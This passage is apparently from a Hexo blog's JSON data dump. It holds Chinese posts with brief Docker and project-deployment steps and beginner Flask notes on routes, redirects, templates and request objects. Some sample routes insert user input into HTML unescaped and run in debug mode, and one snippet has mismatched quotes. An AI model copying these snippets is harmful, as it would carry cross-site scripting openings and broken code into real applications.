title=\"四、总结\"></a>四、总结</h3><ul>\n<li>单篇文献整理</li>\n<li>多篇文献整合</li>\n<li>文献汇报与求助</li>\n</ul>\n"},{"title":"Docker 一键部署","date":"2023-07-02T13:13:45.000Z","cover":"img/bg1.jpg","_content":"\n# Docker 一键部署\n\n## 一、基本操作\n\n1. sudo passwd 安装完成 ubuntu 系统后，设置 root 密码\n2. 切换至 root 管理员 su 3、git clone cd / && git clone http://用户名:密码@47.103.136.241/other/builder.git\n3. 给脚本赋予可执行权限 chmod +x build.sh\n4. 执行脚本 ./build.sh\n5. 运行脚本，使用脚本进行初始环境安装 安装途中有步骤需要按[enter]操作四次左右\n6. 运行脚本，使用脚本进行前端编译环境安装 安装途中有步骤需要按[enter]操作，如果出现报错忽略，再次执行\n7. cd 到 builder 项目目录下，./builder.sh\n8. 首先构建本地运行环境，选择公共功能，选择需要的后端环境\n9. cd 到项目目录下，修改 setting.py 文件 ip\n10. cd 到 server 目录，flask run\n","source":"_posts/Docker一键部署.md","raw":"---\ntitle: Docker 一键部署\ndate: 2023-07-2 21:13:45\ncategories:\n  - 运维\ntags:\n  - Docker\n\ncover: img/bg1.jpg\n---\n\n# Docker 一键部署\n\n## 一、基本操作\n\n1. sudo passwd 安装完成 ubuntu 系统后，设置 root 密码\n2. 切换至 root 管理员 su 3、git clone cd / && git clone http://用户名:密码@47.103.136.241/other/builder.git\n3. 给脚本赋予可执行权限 chmod +x build.sh\n4. 执行脚本 ./build.sh\n5. 运行脚本，使用脚本进行初始环境安装 安装途中有步骤需要按[enter]操作四次左右\n6. 运行脚本，使用脚本进行前端编译环境安装 安装途中有步骤需要按[enter]操作，如果出现报错忽略，再次执行\n7. cd 到 builder 项目目录下，./builder.sh\n8. 首先构建本地运行环境，选择公共功能，选择需要的后端环境\n9. cd 到项目目录下，修改 setting.py 文件 ip\n10. cd 到 server 目录，flask run\n","slug":"Docker一键部署","published":1,"updated":"2023-07-04T07:15:46.263Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cljnys8n00000ls9cexp1h5ee","content":"<h1 id=\"Docker-一键部署\"><a href=\"#Docker-一键部署\" class=\"headerlink\" title=\"Docker 一键部署\"></a>Docker 一键部署</h1><h2 id=\"一、基本操作\"><a href=\"#一、基本操作\" class=\"headerlink\" title=\"一、基本操作\"></a>一、基本操作</h2><ol>\n<li>sudo passwd 安装完成 ubuntu 系统后，设置 root 密码</li>\n<li>切换至 root 管理员 su 3、git clone cd / &amp;&amp; git clone http://用户名:密码@47.103.136.241/other/builder.git</li>\n<li>给脚本赋予可执行权限 chmod +x build.sh</li>\n<li>执行脚本 ./build.sh</li>\n<li>运行脚本，使用脚本进行初始环境安装 安装途中有步骤需要按[enter]操作四次左右</li>\n<li>运行脚本，使用脚本进行前端编译环境安装 安装途中有步骤需要按[enter]操作，如果出现报错忽略，再次执行</li>\n<li>cd 到 builder 项目目录下，./builder.sh</li>\n<li>首先构建本地运行环境，选择公共功能，选择需要的后端环境</li>\n<li>cd 到项目目录下，修改 setting.py 文件 ip</li>\n<li>cd 到 server 目录，flask run</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Docker-一键部署\"><a href=\"#Docker-一键部署\" class=\"headerlink\" title=\"Docker 一键部署\"></a>Docker 一键部署</h1><h2 id=\"一、基本操作\"><a href=\"#一、基本操作\" class=\"headerlink\" title=\"一、基本操作\"></a>一、基本操作</h2><ol>\n<li>sudo passwd 安装完成 ubuntu 系统后，设置 root 密码</li>\n<li>切换至 root 管理员 su 3、git clone cd / &amp;&amp; git clone http://用户名:密码@47.103.136.241/other/builder.git</li>\n<li>给脚本赋予可执行权限 chmod +x build.sh</li>\n<li>执行脚本 ./build.sh</li>\n<li>运行脚本，使用脚本进行初始环境安装 安装途中有步骤需要按[enter]操作四次左右</li>\n<li>运行脚本，使用脚本进行前端编译环境安装 安装途中有步骤需要按[enter]操作，如果出现报错忽略，再次执行</li>\n<li>cd 到 builder 项目目录下，./builder.sh</li>\n<li>首先构建本地运行环境，选择公共功能，选择需要的后端环境</li>\n<li>cd 到项目目录下，修改 setting.py 文件 ip</li>\n<li>cd 到 server 目录，flask run</li>\n</ol>\n"},{"title":"Flask 基础","date":"2023-07-04T07:13:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n# Flask 基础\n\n## 一、基础概念\n\n- Web 框架，一组库和模块，使 Web 应用程序开发人员能够编写应用程序，而不必担心协议、线程管理等低级细节；\n- Flask，由 Python 编写的 web 应用程序框架，基于 Werkzeug WSGI 工具包和 Jinja2 模板引擎。\n- WSGI，Web Server Gateway Interface， Web 服务器网关接口，是 web 服务器和 web 应用程序之间通用接口的规范。\n- Werkzeug，WSGI 工具包，实现了请求，响应对象和其他使用函数。\n- Flask 环境，安装 Flask 需要 Python2.6 或者更高版本，虽然 flask 及其以来适用于 Python3，但是很多 Flask 拓展并不支持，建议在 python2.7 安装 flask\n\n## 二、环境安装\n\n1. 安装虚拟环境\n\n```shell\npip install virtualenv\nsudo apt-get install virtualenv\n```\n\n2. 新建文件夹，创建虚拟环境\n\n```shell\nmkdir newPro\ncd newPro\nvirtualenv venv\nvenv\\scripts\\activate\npip install flask\npip install flask -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com\n```\n\n3. 测试\n\n```python\nfrom flask import Flask\n\n# flask构造函数使用当前模块（_name_）名称作为参数\napp = Flask(__name__)\n\n#route()函数是一个装饰器，告诉应用程序那个url应该调用（rule,options)\n#rule参数表示该函数的url绑定，options是要转发给基础rule对象的参数列表\n@app.route('/')\ndef index():\n    return '<h1>Hello World!</h1>'\n\n@app.route('/user')\ndef getUserInfor():\n    return '<h1>user page</h1>'\n\n\n\nif __name__ == '__main__':\n    app.run(host=\"127.0.0.1\",port=\"3333\",debug=True)\n```\n\n现代 Web 框架使用路由技术来帮助用户记住应用程序 URL。 可以直接访问所需的页面，而无需从主页导航。\n\n## 三、基础使用\n\n### 1. 变量规则\n\n- string\n\n- int\n\n- float\n\n- path：接受用作目录分隔符的斜杠\n\n  ```python\n\n  @app.route('/user/<int:id>')\n  def getUserID(id):\n      return '<h1>Hello,%d!</h1>'%id\n\n  @app.route('/user/<float:id>')\n  def getUserID2(id):\n      return '<h1>Hello,%f!</h1>'%id\n\n  @app.route('/user/<path:id>')\n  def getUserID3(id):\n      return '<h1>Hello,%s!</h1>'%id\n  ```\n\n### 2. URL 构建\n\n**url_for（）**函数对于动态构建特定函数的 URL 非常有用。 该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于 URL 的可变部分\n\n```python\n\n@app.route('/show_blog/<int:postID>')\ndef show_blog(postID):\n    return '<h1>blog number is %d</h1>'%postID\n\n@app.route('/blog/<int:postID>')\ndef show_blog_admin(postID):\n    if postID==0:\n      return redirect(url_for('show_blog',postID=1))\n    else:\n      return redirect(url_for('show_blog',postID=postID))\n\n```\n\n### 3. Http 方法\n\n在此协议中，定义了从指定的 URL 检索不同的数据方法\n\n- GET：不加密发送数据到服务器\n- HEAD：和 GET 一样，没有响应体（？）\n- POST：用于将 HTML 表单数据发送到服务器，POST 方法接收的数据不由服务器缓存\n- PUT：用所上传的内容替换目标资源的所有当前表示\n- DELETE：删除由 URL 给定的目标资源的所有当前表示\n\n```py\nfrom flask import Flask,redirect,url_for,render_template,request,session,flash\n\napp=Flask(__name__)\n\n@app.route('/success/<name>')\ndef success(name):\n  return 'welcome %s'%name\n\n@app.route('/login',methods=['POST','GET'])\ndef login():\n  if request.method=='POST':\n    user=request.form['nm']\n    return redirect(url_for('success',name='POST:'+user))\n  else:\n    user=request.args.get('nm')\n    return redirect(url_for('success',name='GET:'+user))\n\nif __name__=='__main__':\n  app.run(debug=True)\n```\n\n- 服务器通过 post 方法接收数据，从表单数据获得的“nm”参数的值通过\n\n```py\nuser=request.form['nm']\n```\n\n- 服务器通过 get 方法接收数据，从表单数据获得的“nm”参数通过\n\n```py\nUser=request.args.get('nm')\n```\n\n### 4.模板\n\n可以以 HTML 的形式返回绑定到某个 URL 的函数输出\n\n```python\n@app.route('/')\ndef index():\n   return '<html><body><h1>Hello World'</h1></body></html>'\n\n```\n\n从 python 代码返回 HTML 很麻烦，可以利用基于 Flask 的 Jinja2 模板引擎，通过`render_template()`函数呈现 HTML 文件\n\n```python\n@app.route('/')\ndef index():\n    return render_template('login.html')\n```\n\nFlask 将尝试在 templates 文件夹中找到与此脚本所在的文件夹中的 HTML 文件。\n\nJinja2 使用一下定界符从 HTML 转义：\n\n{.% ... %.} for statements\n{.{ ... }.} for expression to print to the template output\n{# ... #} for comments not included in the template output\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>Document</title>\n  </head>\n\n  <body>\n    <h1>Welcome,{{ name }}</h1>\n    {% if age > 20 %}\n    <h2>You are very nice~</h2>\n    {% else %}\n    <h2>You are very young~</h2>\n    {% endif %}\n  </body>\n</html>\n```\n\n### 5. 静态文件\n\n网络应用程序通常需要一个静态文件，例如支持显示网页的 js 文件或者 css 文件；\n\n通常，网络服务器配置服务，但是在开发过程中，这些文件从 static 文件夹或者模块旁提供；\n\n```html\n<script\n  type=\"text/javascript\"\n  src=\"{{ url_for('static', filename = 'index.js') }}\"\n></script>\n```\n\n### 6. Flask 请求对象\n\n来自客户端网页得数据作为全局请求对象发送到服务器。\n\n- 表单：字典对象，包含表单参数键值对\n- args：在问号后面得 url 得一部分查询字符串得解析内容\n- cookie:保存 cookie 名称和值得字典对象\n- 文件：与上传文件相关得数据\n- 方法：当前请求方法\n\n### 7. 将表单数据发送到模板\n\n```\n\n```\n","source":"_posts/Flask基础.md","raw":"---\ntitle: Flask 基础\ndate: 2023-07-04 15:13:45\ncategories:\n  - 后端\ntags:\n  - Flask\n  - 笔记\n  - Python\n\nmp3:\ncover: img/bg3.jpg\n---\n\n# Flask 基础\n\n## 一、基础概念\n\n- Web 框架，一组库和模块，使 Web 应用程序开发人员能够编写应用程序，而不必担心协议、线程管理等低级细节；\n- Flask，由 Python 编写的 web 应用程序框架，基于 Werkzeug WSGI 工具包和 Jinja2 模板引擎。\n- WSGI，Web Server Gateway Interface， Web 服务器网关接口，是 web 服务器和 web 应用程序之间通用接口的规范。\n- Werkzeug，WSGI 工具包，实现了请求，响应对象和其他使用函数。\n- Flask 环境，安装 Flask 需要 Python2.6 或者更高版本，虽然 flask 及其以来适用于 Python3，但是很多 Flask 拓展并不支持，建议在 python2.7 安装 flask\n\n## 二、环境安装\n\n1. 安装虚拟环境\n\n```shell\npip install virtualenv\nsudo apt-get install virtualenv\n```\n\n2. 新建文件夹，创建虚拟环境\n\n```shell\nmkdir newPro\ncd newPro\nvirtualenv venv\nvenv\\scripts\\activate\npip install flask\npip install flask -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com\n```\n\n3. 测试\n\n```python\nfrom flask import Flask\n\n# flask构造函数使用当前模块（_name_）名称作为参数\napp = Flask(__name__)\n\n#route()函数是一个装饰器，告诉应用程序那个url应该调用（rule,options)\n#rule参数表示该函数的url绑定，options是要转发给基础rule对象的参数列表\n@app.route('/')\ndef index():\n    return '<h1>Hello World!</h1>'\n\n@app.route('/user')\ndef getUserInfor():\n    return '<h1>user page</h1>'\n\n\n\nif __name__ == '__main__':\n    app.run(host=\"127.0.0.1\",port=\"3333\",debug=True)\n```\n\n现代 Web 框架使用路由技术来帮助用户记住应用程序 URL。 可以直接访问所需的页面，而无需从主页导航。\n\n## 三、基础使用\n\n### 1. 变量规则\n\n- string\n\n- int\n\n- float\n\n- path：接受用作目录分隔符的斜杠\n\n  ```python\n\n  @app.route('/user/<int:id>')\n  def getUserID(id):\n      return '<h1>Hello,%d!</h1>'%id\n\n  @app.route('/user/<float:id>')\n  def getUserID2(id):\n      return '<h1>Hello,%f!</h1>'%id\n\n  @app.route('/user/<path:id>')\n  def getUserID3(id):\n      return '<h1>Hello,%s!</h1>'%id\n  ```\n\n### 2. URL 构建\n\n**url_for（）**函数对于动态构建特定函数的 URL 非常有用。 该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于 URL 的可变部分\n\n```python\n\n@app.route('/show_blog/<int:postID>')\ndef show_blog(postID):\n    return '<h1>blog number is %d</h1>'%postID\n\n@app.route('/blog/<int:postID>')\ndef show_blog_admin(postID):\n    if postID==0:\n      return redirect(url_for('show_blog',postID=1))\n    else:\n      return redirect(url_for('show_blog',postID=postID))\n\n```\n\n### 3. Http 方法\n\n在此协议中，定义了从指定的 URL 检索不同的数据方法\n\n- GET：不加密发送数据到服务器\n- HEAD：和 GET 一样，没有响应体（？）\n- POST：用于将 HTML 表单数据发送到服务器，POST 方法接收的数据不由服务器缓存\n- PUT：用所上传的内容替换目标资源的所有当前表示\n- DELETE：删除由 URL 给定的目标资源的所有当前表示\n\n```py\nfrom flask import Flask,redirect,url_for,render_template,request,session,flash\n\napp=Flask(__name__)\n\n@app.route('/success/<name>')\ndef success(name):\n  return 'welcome %s'%name\n\n@app.route('/login',methods=['POST','GET'])\ndef login():\n  if request.method=='POST':\n    user=request.form['nm']\n    return redirect(url_for('success',name='POST:'+user))\n  else:\n    user=request.args.get('nm')\n    return redirect(url_for('success',name='GET:'+user))\n\nif __name__=='__main__':\n  app.run(debug=True)\n```\n\n- 服务器通过 post 方法接收数据，从表单数据获得的“nm”参数的值通过\n\n```py\nuser=request.form['nm']\n```\n\n- 服务器通过 get 方法接收数据，从表单数据获得的“nm”参数通过\n\n```py\nUser=request.args.get('nm')\n```\n\n### 4.模板\n\n可以以 HTML 的形式返回绑定到某个 URL 的函数输出\n\n```python\n@app.route('/')\ndef index():\n   return '<html><body><h1>Hello World'</h1></body></html>'\n\n```\n\n从 python 代码返回 HTML 很麻烦，可以利用基于 Flask 的 Jinja2 模板引擎，通过`render_template()`函数呈现 HTML 文件\n\n```python\n@app.route('/')\ndef index():\n    return render_template('login.html')\n```\n\nFlask 将尝试在 templates 文件夹中找到与此脚本所在的文件夹中的 HTML 文件。\n\nJinja2 使用一下定界符从 HTML 转义：\n\n{.% ... %.} for statements\n{.{ ... }.} for expression to print to the template output\n{# ... #} for comments not included in the template output\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>Document</title>\n  </head>\n\n  <body>\n    <h1>Welcome,{{ name }}</h1>\n    {% if age > 20 %}\n    <h2>You are very nice~</h2>\n    {% else %}\n    <h2>You are very young~</h2>\n    {% endif %}\n  </body>\n</html>\n```\n\n### 5. 静态文件\n\n网络应用程序通常需要一个静态文件，例如支持显示网页的 js 文件或者 css 文件；\n\n通常，网络服务器配置服务，但是在开发过程中，这些文件从 static 文件夹或者模块旁提供；\n\n```html\n<script\n  type=\"text/javascript\"\n  src=\"{{ url_for('static', filename = 'index.js') }}\"\n></script>\n```\n\n### 6. Flask 请求对象\n\n来自客户端网页得数据作为全局请求对象发送到服务器。\n\n- 表单：字典对象，包含表单参数键值对\n- args：在问号后面得 url 得一部分查询字符串得解析内容\n- cookie:保存 cookie 名称和值得字典对象\n- 文件：与上传文件相关得数据\n- 方法：当前请求方法\n\n### 7. 将表单数据发送到模板\n\n```\n\n```\n","slug":"Flask基础","published":1,"updated":"2023-07-04T07:26:30.334Z","_id":"cljnys8n40001ls9c4ajzgscn","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Flask-基础\"><a href=\"#Flask-基础\" class=\"headerlink\" title=\"Flask 基础\"></a>Flask 基础</h1><h2 id=\"一、基础概念\"><a href=\"#一、基础概念\" class=\"headerlink\" title=\"一、基础概念\"></a>一、基础概念</h2><ul>\n<li>Web 框架，一组库和模块，使 Web 应用程序开发人员能够编写应用程序，而不必担心协议、线程管理等低级细节；</li>\n<li>Flask，由 Python 编写的 web 应用程序框架，基于 Werkzeug WSGI 工具包和 Jinja2 模板引擎。</li>\n<li>WSGI，Web Server Gateway Interface， Web 服务器网关接口，是 web 服务器和 web 应用程序之间通用接口的规范。</li>\n<li>Werkzeug，WSGI 工具包，实现了请求，响应对象和其他使用函数。</li>\n<li>Flask 环境，安装 Flask 需要 Python2.6 或者更高版本，虽然 flask 及其以来适用于 Python3，但是很多 Flask 拓展并不支持，建议在 python2.7 安装 flask</li>\n</ul>\n<h2 id=\"二、环境安装\"><a href=\"#二、环境安装\" class=\"headerlink\" title=\"二、环境安装\"></a>二、环境安装</h2><ol>\n<li>安装虚拟环境</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">pip install virtualenv<br>sudo apt-get install virtualenv<br></code></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>新建文件夹，创建虚拟环境</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">mkdir newPro<br>cd newPro<br>virtualenv venv<br>venv\\scripts\\activate<br>pip install flask<br>pip install flask -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com<br></code></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>测试</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask<br><br><span class=\"hljs-comment\"># flask构造函数使用当前模块（_name_）名称作为参数</span><br>app = Flask(__name__)<br><br><span class=\"hljs-comment\">#route()函数是一个装饰器，告诉应用程序那个url应该调用（rule,options)</span><br><span class=\"hljs-comment\">#rule参数表示该函数的url绑定，options是要转发给基础rule对象的参数列表</span><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">index</span>():<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello World!&lt;/h1&gt;&#x27;</span><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserInfor</span>():<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;user page&lt;/h1&gt;&#x27;</span><br><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class=\"hljs-string\">&quot;127.0.0.1&quot;</span>,port=<span class=\"hljs-string\">&quot;3333&quot;</span>,debug=<span class=\"hljs-literal\">True</span>)<br></code></pre></td></tr></table></figure>\n\n<p>现代 Web 框架使用路由技术来帮助用户记住应用程序 URL。 可以直接访问所需的页面，而无需从主页导航。</p>\n<h2 id=\"三、基础使用\"><a href=\"#三、基础使用\" class=\"headerlink\" title=\"三、基础使用\"></a>三、基础使用</h2><h3 id=\"1-变量规则\"><a href=\"#1-变量规则\" class=\"headerlink\" title=\"1. 变量规则\"></a>1. 变量规则</h3><ul>\n<li><p>string</p>\n</li>\n<li><p>int</p>\n</li>\n<li><p>float</p>\n</li>\n<li><p>path：接受用作目录分隔符的斜杠</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user/&lt;int:id&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserID</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">id</span></span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello,%d!&lt;/h1&gt;&#x27;</span>%<span class=\"hljs-built_in\">id</span><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user/&lt;float:id&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserID2</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">id</span></span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello,%f!&lt;/h1&gt;&#x27;</span>%<span class=\"hljs-built_in\">id</span><br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/user/&lt;path:id&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">getUserID3</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">id</span></span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;Hello,%s!&lt;/h1&gt;&#x27;</span>%<span class=\"hljs-built_in\">id</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-URL-构建\"><a href=\"#2-URL-构建\" class=\"headerlink\" title=\"2. URL 构建\"></a>2. URL 构建</h3><p><strong>url_for（）</strong>函数对于动态构建特定函数的 URL 非常有用。 该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于 URL 的可变部分</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/show_blog/&lt;int:postID&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show_blog</span>(<span class=\"hljs-params\">postID</span>):<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;h1&gt;blog number is %d&lt;/h1&gt;&#x27;</span>%postID<br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/blog/&lt;int:postID&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show_blog_admin</span>(<span class=\"hljs-params\">postID</span>):<br>    <span class=\"hljs-keyword\">if</span> postID==<span class=\"hljs-number\">0</span>:<br>      <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;show_blog&#x27;</span>,postID=<span class=\"hljs-number\">1</span>))<br>    <span class=\"hljs-keyword\">else</span>:<br>      <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;show_blog&#x27;</span>,postID=postID))<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-Http-方法\"><a href=\"#3-Http-方法\" class=\"headerlink\" title=\"3. Http 方法\"></a>3. Http 方法</h3><p>在此协议中，定义了从指定的 URL 检索不同的数据方法</p>\n<ul>\n<li>GET：不加密发送数据到服务器</li>\n<li>HEAD：和 GET 一样，没有响应体（？）</li>\n<li>POST：用于将 HTML 表单数据发送到服务器，POST 方法接收的数据不由服务器缓存</li>\n<li>PUT：用所上传的内容替换目标资源的所有当前表示</li>\n<li>DELETE：删除由 URL 给定的目标资源的所有当前表示</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs py\"><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask,redirect,url_for,render_template,request,session,flash<br><br>app=Flask(__name__)<br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/success/&lt;name&gt;&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">success</span>(<span class=\"hljs-params\">name</span>):<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;welcome %s&#x27;</span>%name<br><br><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/login&#x27;</span>,methods=[<span class=\"hljs-string\">&#x27;POST&#x27;</span>,<span class=\"hljs-string\">&#x27;GET&#x27;</span>]</span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">login</span>():<br>  <span class=\"hljs-keyword\">if</span> request.method==<span class=\"hljs-string\">&#x27;POST&#x27;</span>:<br>    user=request.form[<span class=\"hljs-string\">&#x27;nm&#x27;</span>]<br>    <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;success&#x27;</span>,name=<span class=\"hljs-string\">&#x27;POST:&#x27;</span>+user))<br>  <span class=\"hljs-keyword\">else</span>:<br>    user=request.args.get(<span class=\"hljs-string\">&#x27;nm&#x27;</span>)<br>    <span class=\"hljs-keyword\">return</span> redirect(url_for(<span class=\"hljs-string\">&#x27;success&#x27;</span>,name=<span class=\"hljs-string\">&#x27;GET:&#x27;</span>+user))<br><br><span class=\"hljs-keyword\">if</span> __name__==<span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class=\"hljs-literal\">True</span>)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>服务器通过 post 方法接收数据，从表单数据获得的“nm”参数的值通过</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs py\">user=request.form[<span class=\"hljs-string\">&#x27;nm&#x27;</span>]<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>服务器通过 get 方法接收数据，从表单数据获得的“nm”参数通过</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs py\">User=request.args.get(<span class=\"hljs-string\">&#x27;nm&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-模板\"><a href=\"#4-模板\" class=\"headerlink\" title=\"4.模板\"></a>4.模板</h3><p>可以以 HTML 的形式返回绑定到某个 URL 的函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">index</span>():<br>   <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&#x27;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello World&#x27;</span>&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<span class=\"hljs-string\">&#x27;</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n\n<p>从 python 代码返回 HTML 很麻烦，可以利用基于 Flask 的 Jinja2 模板引擎，通过<code>render_template()</code>函数呈现 HTML 文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-meta\">@app.route(<span class=\"hljs-params\"><span class=\"hljs-string\">&#x27;/&#x27;</span></span>)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">index</span>():<br>    <span class=\"hljs-keyword\">return</span> render_template(<span 